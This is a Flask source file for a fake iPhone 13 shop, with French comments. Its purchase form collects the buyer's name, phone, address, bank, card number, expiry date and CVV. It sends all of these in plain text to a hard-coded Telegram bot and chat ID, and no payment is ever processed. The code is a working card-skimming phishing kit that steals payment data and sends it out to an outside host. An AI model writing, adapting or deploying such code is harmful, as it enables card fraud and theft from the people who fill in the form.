from flask import Flask, render_template, request, redirect, url_for, session
import requests

app = Flask(__name__)
app.secret_key = 'cle_secrete_pour_session_iphone13'

# Token et chat_id Telegram
TELEGRAM_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
TELEGRAM_CHAT_ID = '6297861735'

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    r = requests.post(url, data=payload)
    return r.status_code == 200

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/achat', methods=['GET', 'POST'])
def achat():
    if request.method == 'POST':
        nom = request.form.get('nom')
        tel = request.form.get('tel')
        adresse = request.form.get('adresse')
        banque = request.form.get('banque')
        carte = request.form.get('carte')
        exp = request.form.get('exp')
        cvv = request.form.get('cvv')

        message = f"<b>Nouvelle commande iPhone 13 :</b>\n"\
                  f"Nom complet : {nom}\n"\
                  f"Téléphone : {tel}\n"\
                  f"Adresse : {adresse}\n"\
                  f"Banque : {banque}\n"\
                  f"Carte bancaire : {carte}\n"\
                  f"Expiration : {exp}\n"\
                  f"CVV : {cvv}"

        send_telegram_message(message)
        session['nom'] = nom
        return redirect(url_for('merci'))

    return render_template('achat.html')

@app.route('/merci')
def merci():
    nom = session.get('nom', '')
    return render_template('merci.html', nom=nom)

if __name__ == '__main__':
    app.run(debug=True)
